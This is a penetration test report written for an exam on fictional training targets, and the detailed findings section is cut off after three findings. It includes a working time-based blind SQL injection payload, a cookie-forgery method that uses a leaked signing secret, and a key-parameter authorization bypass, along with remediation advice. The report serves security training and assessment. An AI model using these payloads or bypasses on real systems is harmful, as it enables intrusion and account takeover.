# CWEE EXAM {#cwee-exam}

## Table of Contents {#table-of-contents}

* [CWEE EXAM](#cwee-exam)
    * [Table of Contents](#table-of-contents)
    * [Meta](#meta)
    * [Executive Summary](#executive-summary)
    * [Scope](#scope)
    * [Web Application Security Assessment Summary](#web-application-security-assessment-summary)
    * [Findings](#findings)
        * [SQL Injection at https://www.royalflush.htb/forgot](#f7111d6e-f236-41a6-8604-e248aea5426c)
        * [Leaked AUTH_SECRET → cookie forgery](#2f5bc430-0879-431e-89a9-4e66141b48f2)
        * [Role-upgrade bypass via parameter logic flaw (fookey)](#ef542905-12d7-4c90-890a-b95396542be5)
        * [Leaked credentials charles:charles on forum.royalflush.htb](#28049f2f-465c-4337-ac38-1f4f6bdde7c0)
        * [No domain restriction at registration](#009c6a45-40b2-44ee-8c6b-769c061549e0)
        * [NoSQL Injection at verify-email endpoint forum.royalflush.htb](#b5ce6c43-ed46-4f81-8e44-30a5e758daae)
        * [Creds Leak at forum.royalflush.htb](#11975b2f-d6df-4f75-989c-19dd279e2467)
        * [SQL Injection at Vault.royalflush.htb](#3d54335f-b7d9-4631-b09e-78cdc0d306a8)
        * [.NET BinaryFormatter deserialization](#0038712a-c54f-41b6-bad2-da0c98d68114)
        * [LDAP injection at ldap.vitamedix.htb](#6bfa3977-88f0-4c2c-91d3-978ce8913206)
        * [Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)](#5296e7d1-3552-4af2-8303-4f39f503ee54)
        * [Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak](#a5772f07-ca79-4f30-9424-51762dbe1fc8)
        * [Email header injection (CRLF) in password reset](#d344076c-001e-4d19-acab-ec9e495fab71)
        * [DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***)](#0f92f352-828c-4b46-b853-6592beec8b3d)
        * [NoSQL Injection in /api/validateToken www.vitamedix.htb](#aaa9d649-31b9-4592-992d-51182c427f73)
        * [DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft](#edb020c8-9ce8-4b17-9b9e-5f074ae0f552)
        * [PDF generation SSRF via DNS rebinder → internal CouchDB access](#b7b812b2-8457-49f0-8f78-f9935efd02e2)
        * [RCE via eval on newsletter.vitamedix.htb](#1f15992e-d5b7-4d4a-8b5c-598cdb328a95)
        * [XPath injection in q parameter at query.php&home.php](#35596b72-d4e0-4ea3-ba1a-5c6dd5d924e0)
        * [Race condition on admin_panel.php](#2b749d43-75e4-4608-ba24-404b1cadbaae)
        * [request smuggling Attack at securedata.htb](#95cec507-bee6-491d-9043-837dbecdff63)
        * [XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning ](#9d9448f8-0a56-4e7d-ab86-82a1e6410844)
        * [Remote Code Execution in http://api.securedata.htb/service_status?service=nginx](#d80d28b1-7608-40ff-a635-4a64c7c47b08)
    * [Appendix](#appendix)
        * [Finding Severities](#finding-severities)
        * [Testing Methodology](#testing-methodology)
        * [Flags Discovered](#flags-discovered)
        * [Exploits](#exploits)

## Meta {#meta}

### HTB Logo

![logo](assets/logo-banner.svg)

### Report Date

8 August 2026 – 17 August 2026

### HTB Candidate

**Full Name**

Al-hassan Ahmed Habib

**Title**

Web penetration tester

**Email**

Habibhassan293@gmail.com




### Engagement Contacts



| Company Contacts      |                         |                                                     |
| --------------------- | ----------------------- | --------------------------------------------------- |
| **Primary Contact**   | **Title**               | **Primary Contact Email**                           |
| Yelon Husk            | Chief Executive Officer | [yelon@royalflush.htb](mailto:yelon@royalflush.htb) |
| **Secondary Contact** | **Title**               | **Secondary Contact Email**                         |
| Zeyad AlMadani        | Chief Technical Officer | [zeyad@securedata.htb](mailto:zeyad@securedata.htb) |

| Assessor Contact  |            |                            |
| ----------------- | ---------- | -------------------------- |
| **Assessor Name** | **Title**  | **Assessor Contact Email** |
| Alhassan Ahmed Habib        | Web Penetration tester | Habibhassan293@gmail.com                 |


### Statement of Confidentiality

The contents of this document have been developed by Hack The Box. Hack The Box considers the contents of this document to be proprietary and business confidential information. This information is to be used only in the performance of its intended use. This document may not be released to another vendor, business partner or contractor without prior written consent from Hack The Box. Additionally, no portion of this document may be communicated, reproduced, copied or distributed without the prior consent of Hack The Box.

The contents of this document do not constitute legal advice. Hack The Box's offer of services that relate to compliance, litigation or other legal interests are not intended as legal counsel and should not be taken as such. The assessment detailed herein is against a fictional company for training and examination purposes, and the vulnerabilities in no way affect Hack The Box external or internal infrastructure.



## Executive Summary {#executive-summary}

From 8 August 2026 to 17 August 2026, Royal Flush Ltd., Secure Data Ltd., and Vita Medix Ltd. engaged Alhassan Ahmed Habib to conduct a targeted Web Application Penetration Test of their public-facing web applications and supporting infrastructure. The objective was to identify security weaknesses that could allow unauthorized access, data theft, or disruption of business services, and to provide clear, actionable guidance on how to fix them.

### Overall Risk Posture

The assessment identified **23 security findings**, of which **7 are Critical** and **12 are High**. This represents a severe overall risk to the three organizations. Most of the Critical and High findings can be exploited by external attackers without prior access, and several allow complete takeover of user accounts, administrator accounts, or the underlying servers.

The most significant risks identified include:

* **Full account compromise:** Attackers can take over user and administrator accounts through stolen credentials, forged login cookies, or weak access controls.
* **Direct server takeover:** Several applications allow an attacker to run commands on the server, which can lead to complete control of the system and access to internal networks.
* **Data exposure:** Sensitive information, including passwords, email addresses, and internal credentials, was found exposed in public and staff-only areas of the applications.
* **Internal network access:** Weaknesses in public applications can be used to reach internal services and databases that should not be accessible from the internet.

### Business Impact

If left unaddressed, these weaknesses could result in unauthorized access to customer and employee data, financial loss, reputational damage, regulatory penalties, and disruption of business operations. Because many findings are straightforward to exploit, the likelihood of successful attack is high.

### Key Recommendations

1. **Fix the Critical and High findings immediately**, starting with those that allow server takeover and account compromise.
2. **Review and strengthen authentication and access controls** across all applications, including multi-factor authentication for administrators.
3. **Remove or protect secrets** such as passwords, API keys, and cryptographic keys; store them in a secure secrets manager rather than in source code or configuration files.
4. **Improve input validation and safe coding practices** to prevent attackers from injecting malicious commands into applications.
5. **Conduct regular security testing** and code reviews to catch similar issues before they reach production.

### Scope and Limitations

All web-related findings that could be proven harmful to the client were considered in-scope. The following activities were out-of-scope for this test:

* Physical attacks against the clients' properties
* Unverified scanner output
* Any vulnerabilities identified through denial-of-service or spam attacks
* Vulnerabilities in third-party libraries unless they could be leveraged to impact the target significantly
* Any theoretical attacks or attacks that require significant user interaction or are considered low-risk


## Approach

The tester performed testing under a mixture of "blackbox" and a "whitebox" approach from 8/8/2026 to 17/8/2026, as follows:


* `RoyalFlush` A whitebox penetration test was carried out against their targets, with access to their web applications' source code on `http://git.royalflush.htb/`.
* `SecureData` A blackbox penetration test was performed, with no further details or access to their web applications.
* `VitaMedix` A mixture of blackbox and whitebox was carried out against all web applications under their sub-domains.

Testing was performed remotely from a non-evasive standpoint, with the goal of uncovering as many misconfigurations and vulnerabilities as possible. Each weakness identified was documented and manually investigated to determine exploitation possibilities and escalation potential.

The tester sought to demonstrate the full impact of every vulnerability, up to and including internal network access. Furthermore, the tester documented the sources of vulnerabilities identified through source code analysis and provided recommended patches to fix them.



## Scope {#scope}

The scope of this assessment was as follows:


| **URL**              | **Description**             |
| -------------------- | --------------------------- |
| www.royalflush.htb   | Main RoyalFlush website     |
| git.royalflush.htb   | RoyalFlush Git Repositories |
| forum.royalflush.htb | RoyalFlush Forums           |
| vault.royalflush.htb | RoyalFlush Secure Vault     |
| \*.securedata.htb    | SecureData web app(s)       |
| \*.vitamedix.htb     | VitaMedix web app(s)        |




## Web Application Security Assessment Summary {#web-application-security-assessment-summary}

### Summary of Findings

During the course of testing, The tester uncovered a total of 23 findings that pose a material risk to clients' web applications and systems. The below table provides a summary of the findings by severity level.



| Finding Severity |          |            |           |           |           |
| ---------------- | -------- | ---------- | --------- | --------- | --------- |
| **Critical**     | **High** | **Medium** | **Low**   | **Info**  | **Total** |
| **7**            | **12**    | **4**      | **0**     | **0**     | **23**     |

Below is a high-level overview of each finding identified during the course of testing. These findings are covered in depth in the [Technical Findings Details](#technical-findings-details) section of this report.



| Finding #                                                                                        | Severity Level | Finding Name               |
| ------------------------------------------------------------------------------------------------ | -------------- | -------------------------- |
| 1.    SQL Injection at https://www.royalflush.htb/forgot                                         | **Critical**   | SQL INJECTION              |
| 2.    Leaked AUTH_SECRET → cookie forgery                                                        | **Critical**   | Leaked AUTH_SECRET         |
| 3.    Role-upgrade bypass via parameter logic flaw (fookey)                                      | **High**       | Logic Flaw                 |
| 4.    Leaked credentials charles:charles on forum.royalflush.htb                                 | **Medium**     | Leaked Credentials         |
| 5.    No domain restriction at registration                                                      | **High**       | Logic Flaw                 |
| 6.    NoSQL Injection at verify-email endpoint forum.royalflush.htb                              | **High**       | NoSQL Injection            |
| 7.    Creds Leak at forum.royalflush.htb                                                         | **High**       | Information Disclosure     |
| 8.    SQL Injection at Vault.royalflush.htb                                                      | **Critical**   | SQL INJECTION              |
| 9.    .NET BinaryFormatter deserialization                                                       | **Critical**   | RCE                        |
| 10.   LDAP injection at ldap.vitamedix.htb                                                       | **High**       | LDAP Injection             |
| 11.   Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)           | **Medium**     | Email Enumeration          |
| 12.   Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak                                | **High**       | Logic Flaw                 |
| 13.   Email header injection (CRLF) in password reset                                            | **High**       | CRLF Injection             |
| 14.   DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***)                             | **Critical**   | Information Disclosure     |
| 15.   NoSQL Injection in /api/validateToken www.vitamedix.htb                                    | **High**       | NoSQL Injection            |
| 16.   DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft              | **High**       | Cross-Site Scripting (XSS) |
| 17.   PDF generation SSRF via DNS rebinder → internal CouchDB access                             | **Critical**   | DNS rebind                 |
| 18.   RCE via eval on newsletter.vitamedix.htb                                                   | **Critical**   | RCE                        |
| 19.   XPath injection in q parameter at query.php&home.php                                       | **High**       | XPath Injection            |
| 20.   Race condition on admin_panel.php                                                          | **Medium**     | Race Condition             |
| 21.   request smuggling Attack at securedata.htb                                                 | **Medium**     | Request Smuggling          |
| 22.   XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning | **High**       | XSS                        |
| 23.   Remote Code Execution in http://api.securedata.htb/service_status?service=nginx            | **High**       | RCE                        |





### Assessment Overview and Recommendations

During the course of testing, 23 material findings were identified across the RoyalFlush, VitaMedix, and SecureData environments. The findings are predominantly rated Critical and High, reflecting severe, readily exploitable weaknesses that expose the applications to unauthorized access, remote code execution, and lateral movement into internal infrastructure.

────────────────────────────────────────────────────────────────────────────────

#### RoyalFlush

RoyalFlush exhibited multiple severe vulnerabilities that allow complete compromise of user accounts and the underlying server.

* SQL Injection at /forgot (Finding #1, Critical): Enables unauthenticated extraction of usernames, email addresses, and password hashes from the database.
* Leaked AUTH_SECRET → cookie forgery (Finding #2, Critical): Allows an attacker to forge authentication cookies for administrative users.
* Role-upgrade logic flaw via fookey (Finding #3, High): Bypasses API key validation through parameter pollution.
* Hardcoded credentials charles:charles (Finding #4, Medium): Default/weak credentials on the forum.
* No domain restriction at registration (Finding #5, High): Permits registration using arbitrary domains.
* NoSQL Injection at verify-email (Finding #6, High): Allows manipulation of email verification queries.
* Credential exposure on the forum (Finding #7, High): Additional passwords and emails disclosed in forum responses.
* SQL Injection in Vault.royalflush.htb (Finding #8, Critical): Permits authenticated database access and file reads.
* .NET BinaryFormatter deserialization (Finding #9, Critical): Leads to remote code execution on the Vault server.

###### Overall risk: The combination of SQL injection, hardcoded secrets, and weak authentication controls places RoyalFlush at critical risk of full compromise.

────────────────────────────────────────────────────────────────────────────────

#### VitaMedix

VitaMedix contains a critical remote-code-execution weakness and several high-severity input-validation and access-control flaws.

* LDAP injection (Finding #10, High): Enables username/password enumeration via ldap.vitamedix.htb.
* Valid email disclosure (Finding #11, Medium): Forgot-password response confirms michael@vitamedix.htb.
* BOLA/IDOR on Storage.vitamedix.htb (Finding #12, High): render.php reads arbitrary file IDs from session without ownership checks, leaking SMTP credentials.
* Email header injection (CRLF) (Finding #13, High): Allows header manipulation in password-reset emails.
* Pi-hole password leak (Finding #14, Critical): WEBPASSWORD: pih*** exposed for DNS.vitamedix:8006.
* NoSQL Injection in verifyToken (Finding #15, High): Regex-based NoSQL injection leaks account-creation tokens.
* Stored XSS (Finding #16, High): Payload stored in user settings executes in the admin browser.
* PDF generation SSRF via DNS rebinder (Finding #17, Critical): Forces the PDF generator to fetch internal CouchDB content.
* RCE via eval (Finding #18, Critical): User-supplied input is passed directly to eval() on newsletter.vitamedix.htb.

###### Overall risk: Insecure evaluation, injection flaws, and broken access controls expose VitaMedix to critical remote compromise and internal service access.

────────────────────────────────────────────────────────────────────────────────

#### SecureData

SecureData contained five findings, all rated High or lower.

* XPath injection in q parameter (Finding #19, High): Manipulation of XML queries at query.php / home.php.
* Race condition on admin_panel.php (Finding #20, Medium): Simultaneous privileged/unprivileged requests can return the admin panel.
* Request smuggling Attack at securedata.htb (Finding #21, Medium): HTTP request smuggling between nginx front-end and Apache back-end.
* XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning (Finding #22, High): Reflected XSS via cache poisoning in Client-IP header.
* Remote Code Execution in http://api.securedata.htb/service_status?service=nginx (Finding #23, High): OS command injection in the service parameter.

###### Overall risk: These weaknesses present meaningful risk to SecureData's confidentiality and integrity, though they are less severe than the Critical findings in RoyalFlush and VitaMedix.

────────────────────────────────────────────────────────────────────────────────

### Key Recommendations

1. Eliminate injection vulnerabilities by parameterizing all database, LDAP, XPath, and NoSQL queries, and enforce strict allow-lists for user input (Findings #1, #6, #8, #10, #13, #15, #19).
2. Rotate and protect secrets — move AUTH_SECRET, SMTP credentials, Pi-hole WEBPASSWORD, and weak/default forum credentials into a secrets manager or environment variables (Findings #2, #4, #7, #12, #14).
3. Disable dangerous evaluation functions such as eval() and replace them with safe parsers (Finding #18).
4. Replace insecure deserialization — migrate from .NET BinaryFormatter to JsonSerializer and cryptographically sign serialized data (Finding #9).
5. Enforce authorization on every endpoint, ensuring users cannot access others' resources or manipulate role/token parameters (Findings #3, #12, #15, #20).
6. Harden email handling by sanitizing input to prevent CRLF injection and restricting registration to approved domains (Findings #5, #13, #11).
7. Mitigate XSS through output encoding, context-aware validation, and a restrictive Content Security Policy (Finding #16).
8. Prevent SSRF in PDF generation and similar features by resolving hostnames internally and enforcing strict destination allow-lists (Finding #17).
9. Remove default or weak credentials, enforce multi-factor authentication for privileged accounts, and rotate credentials regularly (Findings #4, #7).
10. Conduct a source-code review to remove information disclosures such as internal URLs, stack traces, and verbose error messages from production responses.


###### Remediation priority: Address all Critical and High findings immediately to prevent full application or infrastructure compromise. Medium and Low findings should be remediated in the  next maintenance cycle.



## Findings {#findings}

### SQL Injection at https://www.royalflush.htb/forgot {#f7111d6e-f236-41a6-8604-e248aea5426c}

#### CWE

CWE-89

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)

#### Affected Component(s)

* https://www.royalflush.htb/forgot

#### External References

* https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet

#### Description & Cause

The /forgot password-reset endpoint is vulnerable to SQL Injection (CWE-89). User-supplied input is concatenated directly into a SQL query using Python string formatting, allowing an
   attacker to alter the intended query structure and execute arbitrary SQL commands against the PostgreSQL backend. Although an anti_sqli decorator is applied to the route, it relies on a
   blacklist-based regular expression that is trivially bypassed, leaving the underlying injection vector exposed.


   #### Affected Endpoint
   • URL: /forgot
   • Method: POST
   • Parameter: email
   • File: www/__init__.py
   • Line: 104


   The application constructs the user lookup query by interpolating the email form value directly into the SQL string:

   ```python
     cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
   ```

   This approach trusts the raw user input to be a benign email address. Because the value is embedded inside the query string before it reaches the database driver or syntax supplied by the attacker are interpreted as part of the query itself.

   The route is decorated with @anti_sqli, but the implemented filter is a brittle blacklist that only blocks a narrow set of patterns and keywords. It does not enforce parameterized
   queries at the data-access layer and can be circumvented using alternative PostgreSQL syntax — for example, the string-concatenation operator || combined with time-delay functions such  as pg_sleep() — to infer data through blind boolean/time-based techniques.

#### Security Impact

A successful SQL Injection (SQLi) attack targeting the `/forgot` endpoint allows an unauthenticated attacker to execute arbitrary SQL statements within the context of the application's PostgreSQL session.

Because the injected queries run with the privileges of the database user configured in `www/util/db.py`, an attacker can enumerate and exfiltrate data across all accessible databases, schemas, tables, and columns on the connected PostgreSQL instance.

#### Database Schema Exposure (`royalflush`)

Within the primary application database (`royalflush`), the attacker can directly query and exfiltrate data from the following tables and columns:

| **Table**        | **Column**   | **Description / Impact**          |
| ---------------- | ------------ | --------------------------------- |
| **`users`**      | `user_id`    | Unique user identifier            |
|                  | `username`   | Account login name                |
|                  | `password`   | Hashed/plaintext user password    |
|                  | `email`      | User email address                |
|                  | `created_on` | Account creation timestamp        |
| **`roles`**      | `role_id`    | Role identifier                   |
|                  | `role_name`  | Name/level of privilege           |
| **`user_roles`** | `user_id`    | Foreign key linking user          |
|                  | `role_id`    | Foreign key linking role          |
| **`forgot`**     | `token`      | Active password reset token       |
|                  | `user_id`    | Foreign key mapping token to user |


#### Detailed Walkthrough



While reviewing `www/__init__.py`, The tester identified an unauthenticated SQL injection vulnerability in the password reset (`/forgot`) endpoint. The backend constructs SQL queries using raw Python string formatting rather than parameterized statements:



```Python
cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
```

Because user input from the `email` field is directly concatenated into the query, an attacker can manipulate the query structure. Although the application attempts to filter malicious inputs using an `@anti_sqli` decorator, the filter relies on simple regex patterns that are easily bypassed using alternative PostgreSQL syntax.

#### Verification

The tester verified the flaw by issuing a time-based blind SQL injection payload in the `email` parameter:

**Payload submitted:**



```Plaintext
asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'
```

**Resulting SQL query on the server:**



```SQL
SELECT user_id FROM users WHERE email = 'asd@me.c' || (SELECT pg_sleep(10)::text) || ''
```

The database evaluated `pg_sleep(10)` during string concatenation, introducing an intentional 10-second delay in the server's response. This confirmed that injected SQL commands execute directly against the backend PostgreSQL database.

![Screenshot](assets/edited.png)

then the tester created a script to dump usernames and email of users

[www.royalflush.htb-forgot-SQLI.py](exploits/www.royalflush.htb-forgot-SQLI.py)

this lead to dump of user data
`chandler******:lbr***@hotmail.com
`

#### Why the `@anti_sqli` Filter Failed

The `@anti_sqli` decorator attempts to block attacks by searching for common SQL keywords and character sequences (like `;` or `--`). However, blacklist filters are almost always incomplete. In this case, the filter failed because the payload:

* Used string concatenation (`||` and `+`) instead of standard SQL operators blocked by the regex.
* Avoided restricted characters like semicolons or comment markers.
* Employed PostgreSQL-specific functions (`pg_sleep`) that weren't included in the blocklist.

This highlights a fundamental issue: pattern-based filtering cannot reliably stop SQL injection because there are too many valid syntax variations in modern database engines.


#### Patching and Remediation

#### Primary Fix: Implementation of Parameterized Queries

The vulnerability stems from user input being directly concatenated into the SQL statement via Python string formatting:



```python
# Vulnerable Code:
cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
```

To fix this, the raw string formatting must be replaced with a parameterized query. Passing the `email` value as a separate argument ensures the database driver treats it strictly as data, preventing the engine from executing arbitrary SQL payload structures:



```Python
@app.route('/forgot', methods=['GET', 'POST'])
def forgot():
    ...
    else:
        email = request.form.get('email', '').strip()

        if email:
            with db.connect() as conn:
                cursor = conn.cursor()
                # Correct Fix: Parameterized query using placeholders
                cursor.execute(
                    "SELECT user_id FROM users WHERE email = %s",
                    (email,)
                )
                row = cursor.fetchone()
                ...
```

#### Additional Defensive Recommendations

#### 1. Eliminate Blacklist-Based Filters

Remove reliance on custom decorators like `@anti_sqli`. Blacklist filters are easily bypassed because attackers can construct alternative SQL payloads. Parameterized queries should serve as the primary and only defense against SQL injection.

#### 2. Apply Parameterization Universally across Codebase

Ensure prepared statements or an Object-Relational Mapper (ORM) are used consistently across all database operations—including login, account settings, admin panels, and API endpoints—to eliminate similar hidden vulnerabilities elsewhere in the application.

#### 3. Implement Strict Input Validation

Validate that incoming parameters conform to expected formats before submitting them to the database handler. In this case, ensure the string is a valid email format before processing:



```python
import re

email_regex = re.compile(r'^[^@]+@[^@]+\.[^@]+$')

if not email_regex.match(email):
    return redirect(url_for('forgot', e='Invalid email address'))
```

#### 4. Enforce the Principle of Least Privilege

Restrict database user account permissions to only what is required for standard application function. The database user used by the Web app should not have elevated schema alteration, system command, or unnecessary write capabilities across unrelated tables.

#### 5. Set Up Logging & Abnormal Delay Alerts

Monitor application logs for suspicious characters or payload structures. Establish alerts for anomalous database response latencies (e.g., responses taking over 5–10 seconds), which typically signal active time-based blind SQL injection attempts.

#### 6. Retesting & Verification

Following implementation of the patch, the tester should re-run the original time-based exploitation scripts to verify that response times remain consistent and data extraction is no longer possible.



### Leaked AUTH_SECRET → cookie forgery {#2f5bc430-0879-431e-89a9-4e66141b48f2}

#### CWE

CWE-798

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)

#### Affected Component(s)

* http://git.royalflush.htb/developer/www/commit/5f9583d60eadea5c7ac6fb1c0f6c7f10856f502b

#### External References

* [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

#### Description & Cause

#### Finding: Hardcoded Secrets Exposed via Git Repository History

During the repository analysis, the tester discovered that the application’s full `.env` configuration file was committed in the initial Git commit. This file contained critical operational credentials, including database access passwords, keys used to sign Flask sessions, cookie authentication secrets, and administrative API keys.

Although the `.env` file was modified or removed in subsequent commits, the original secrets remain fully accessible within the repository’s commit history.

Because these security-sensitive values were exposed together, an attacker with repository access can chain them to achieve complete application compromise. Most notably, extracting `AUTH_SECRET` and `API_SECRET` allows for unauthenticated account takeovers and complete administrative privilege escalation.

#### Root Causes

##### 1. Commit of Production Secrets to Source Control

The `.env` file was included in the initial codebase commit. Version control systems retain full historical file contents even after a file is deleted or modified in later commits, leaving the credentials permanently exposed unless the Git history is rewritten or purged.

##### 2. Reliance on Static, Unrotated Secrets

The application relies on static, long-lived secrets across its environment without runtime binding or regular rotation:

* **`AUTH_SECRET`**: Signs and verifies all authentication cookies.
* **`API_SECRET`**: Controls access to administrative API endpoints.
* **`APP_SECRET`**: Secures Flask session state and CSRF tokens.
* **`DB_PASS`**: Authenticates directly to the backend PostgreSQL database.

None of these secrets are rotated, restricted by IP/client context, or backed by a server-side session store. Compromising a single secret provides persistent unauthorized access; exposing the entire `.env` file grants complete system control.

##### 3. Lack of Infrastructure and Code Separation

Sensitive environment configuration was stored alongside application source code rather than being injected dynamically at runtime via a dedicated secrets manager, environment-specific deployment pipeline, or secure vault.


#### Security Impact

#### Exploitation Vectors & Impact Breakdown

With access to the leaked `.env` secrets, an attacker can exploit the application across multiple vectors:

* **Session Cookie Forgery (`AUTH_SECRET`)**

  Allows an attacker to forge valid authentication cookies for any account, enabling immediate account takeover—including full administrative access—without needing user credentials.

* **Administrative API Abuse (`API_SECRET`)**

  Bypasses standard authentication controls to directly invoke administrative endpoints such as `/api/changeUsername`, `/api/changeUserPassword`, and `/api/changeUserRole`.

* **Direct Database Access (`DB_USER` / `DB_PASS`)**

  Provides raw access to the backend PostgreSQL database, allowing an attacker to bypass application logic entirely to view, modify, or delete sensitive data across all tables.

* **Flask Session & CSRF Manipulation (`APP_SECRET`)**

  Enables the forgery of Flask session cookies and invalidates anti-CSRF protections, allowing attackers to perform actions on behalf of legitimate users.

* **Mail Relay Abuse (`SMTP_SERVER` / `SMTP_PORT`)**

  Exposes email relay infrastructure, allowing attackers to send unauthorized emails (e.g., phishing campaigns or spam) using the company's trusted domain.


#### Detailed Walkthrough

#### Discovery

During a review of the application source code and commit history, the complete `.env` configuration file was identified in the repository's initial commit. Although modified in subsequent commits, the initial commit remained accessible in Git history. This file contained operational secrets, including `AUTH_SECRET`, which is used by the application to sign user authentication cookies.

![VmwcSTyd](assets/edited-VmwcSTyd.png)

#### Secret Extraction & Mechanism Analysis

The `AUTH_SECRET` key was recovered from the historical `.env` file. Analysis of `www/util/auth.py` indicated that this secret is used to generate HMAC-SHA256 signatures over a YAML payload containing:

* `email`
* `username`
* `expires_at`

#### Cookie Forgery

Using the recovered `AUTH_SECRET`, an authentication token was generated targeting a specific user account:

* **Email:** `lbr***@hotmail.com`
* **Username:** `chandler******`

#### Construction Steps

[www.royalflush.htb-JWT-Forgery.py](exploits/www.royalflush.htb-JWT-Forgery.py)

Output:

```
Email:    lbr***@hotmail.com
Username: chandler******
Cookie:   auth=mRrs0ml/xGSYtboCYb6paVx5eGs9r51O2jerqEC3j7BlbWFpbDogbGJyb3duQGhvdG1haWwuY29tCmV4cGlyZXNfYXQ6IDIxMDE1NjkzMjQKdXNlcm5*****************************
Saved to: cookie_lbrown_hotmail_com.txt
```


#### Verification & Impact

When the forged cookie was set in the browser and applied to subsequent application requests, the server accepted the token as legitimate:

* The session successfully authenticated as `lbrown@hotmail.com` (`chandlerjoseph`).
* Full access was granted to user-restricted endpoints, including `/settings` and role-specific portal functionality.
* Because the `expires_at` field within the payload is attacker-controlled, forged sessions can be set to remain valid indefinitely.

![DoLwKPVb](assets/edited-DoLwKPVb.png)


#### Patching and Remediation

#### 1. Immediate Actions

* **Rotate all exposed secrets immediately:**

  * The following variables from the leaked `.env` file must be considered compromised and replaced:

    * `AUTH_SECRET`

    * `APP_SECRET`

    * `API_SECRET`

    * `DB_PASS`

  * *Note: After rotation, all existing sessions and API keys will be invalidated.*

* **Revoke direct database access if credentials were exposed:**

  * Because `DB_USER` and `DB_PASS` were leaked, assume the database may have been accessed directly.

  * Change the PostgreSQL password and review database access logs for unauthorized connections.

* **Invalidate all active sessions:**

  * Force all users to re-authenticate after rotating `AUTH_SECRET` and `APP_SECRET`.

#### 2. Remove Secrets from Version-Control History

> Deleting the `.env` file from the current branch is **not enough**. Secrets remain in Git history and can be recovered using `git log` or `git show`.

#### Option A: Rewrite History *(Recommended for private/internal repos)*

Use `git-filter-repo` or BFG Repo-Cleaner to strip the `.env` file from all commits:

```bash
# Install git-filter-repo
pip install git-filter-repo

# Remove .env from entire history
git filter-repo --path .env --invert-paths

# Force-push the rewritten history
git push origin --force --all
```

> ⚠️ **Warning:** Force-pushing rewritten history will disrupt other collaborators. Coordinate with the team and re-clone repositories afterward.

#### Option B: Treat Secrets as Permanently Compromised

If rewriting history is not feasible, rotate the secrets and add monitoring. Accept that old values remain in history but ensure they are no longer valid.

#### 3. Prevent Future Commits of Secrets

* **Add `.env` to `.gitignore`:**

  Code snippet

  ```
  # Environment variables and secrets
  .env
  .env.*
  *.pem
  *.key
  ```

* **Use a Secrets Management Solution:** Store secrets outside source code using:

  * Environment variables injected at deployment time

  * A dedicated secrets manager (*AWS Secrets Manager, Azure Key Vault, HashiCorp Vault, Doppler*)

  * Docker secrets or Kubernetes secrets for containerized deployments

* **Use Different Secrets per Environment:** Production, staging, and development must each use unique credentials. Never reuse production secrets in lower environments.

#### 4. Improve Authentication Architecture

* **Transition to Server-Side Sessions:** Move away from purely stateless signed tokens where feasible. Store session identifiers server-side (*e.g., Redis, PostgreSQL*) bound to user accounts to enable:

  * Instant session invalidation on logout

  * Detection and revocation of compromised sessions

  * Elimination of single-point-of-failure signing keys

* **Bind Tokens to Client Properties:** Include IP address or User-Agent attributes, or retain binding info server-side to limit token replay if a cookie is hijacked.

* **Implement Token Rotation & Short Expiration:** Reduce token lifetimes and rotate signing keys periodically. Avoid long-lived tokens.

#### 5. Additional Hardening

* **Configure Pre-Commit Hooks:** Integrate scanning tools to block hardcoded secrets prior to commit:

  * `git-secrets`

  * `truffleHog`

  * `gitleaks`

* **Audit Repository for Additional Leaks:**

  ```bash
  trufflehog filesystem /path/to/repo
  # or
  gitleaks detect --source /path/to/repo
  ```

* **Review Application and Database Logs:** Audit recent activity for:

  * Logins authenticated via forged tokens/cookies

  * Direct database connections from untrusted IP ranges

  * Unauthorized calls targeting `/api/*` endpoints

  * Email relay abuse via `SMTP_SERVER` config

* **Rotate Infrastructure Credentials:** If database credentials or SMTP keys were reused across other services, rotate those secondary instances as well.

#### 6. Verification

After applying patches, run:

```bash
git ls-files | grep .env
```

*Ensure the output returns clean with no tracked `.env` instances.*



### Role-upgrade bypass via parameter logic flaw (fookey) {#ef542905-12d7-4c90-890a-b95396542be5}

#### CWE

CWE-284

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N (8.7 - High)

#### Affected Component(s)

* /api/changeUserRole  params `key`

#### External References

* [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
* [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
* [PortSwigger Web Security Academy - Access control](https://portswigger.net/web-security/access-control)

#### Description & Cause

#### Summary

A critical Authorization bypass exists in the `api_key_required` decorator protecting the `/api/changeUserRole` endpoint.

The validation logic contains a structural mismatch: it checks for the presence of the literal substring `"key="` anywhere within the raw URL query string, but subsequently retrieves the value of a specific parameter named `key` using `request.args.get('key')`.

An unauthorized attacker can exploit this discrepancy by passing a parameter name that contains `key=` as a substring (such as `fkey=`). This satisfies the raw query string check while causing `request.args.get('key')` to return `None`. Because `None` is neither an empty string nor truthy, all validation checks are bypassed, allowing the request to execute state-changing actions without API key verification.

#### Vulnerable Code

Located in `www/__init__.py:36-47`:

